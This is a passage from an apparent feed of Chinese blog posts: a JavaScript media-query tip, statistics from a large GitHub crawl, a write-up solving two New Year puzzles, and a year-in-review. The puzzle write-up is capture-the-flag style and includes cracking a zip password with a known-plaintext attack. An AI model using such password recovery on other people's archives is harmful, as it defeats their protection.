SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 